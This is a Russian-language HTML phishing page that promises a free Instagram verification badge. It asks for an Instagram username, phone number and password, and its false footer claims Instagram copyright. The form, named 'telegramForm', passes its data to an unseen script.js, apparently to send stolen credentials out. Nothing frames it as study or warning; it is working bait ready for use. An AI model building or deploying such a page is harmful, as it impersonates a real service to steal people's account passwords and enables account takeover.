<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Получите бесплатных галочка в Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="1.png">
  </head>
  <body>
    <div class="body">

      <h1 class="text-center">Получите галочку для <br>Instagram бесплатно!</h1>
      <div class="form-container">
        <form id="telegramForm">
          <div class="form-group">
            <label for="username">Имя пользователя Instagram</label>
            <input type="text" class="form-control" id="username" name="username" placeholder="Введите имя пользователя Instagram" required="">
          </div>
          <div class="form-group">
            <label for="tel">Номер телефона</label>
            <input type="tel" class="form-control" id="tel" name="tel" placeholder="Номер телефона" required="">
          </div>
          <div class="form-group">
            <label for="password">Пароль</label>
              <input type="password" class="form-control" id="password" name="password" placeholder="Введите пароль" required="">
            </div>
            
            
        <button type="button" class="btn btn-primary btn-block">
            Отправить
          </button>
          
        <p>&copy; 2025 Instagram. Все права защищены.</p>
      </form>
    </div>

  </div>
    <script src="script.js"></script>
  </body>
</html>
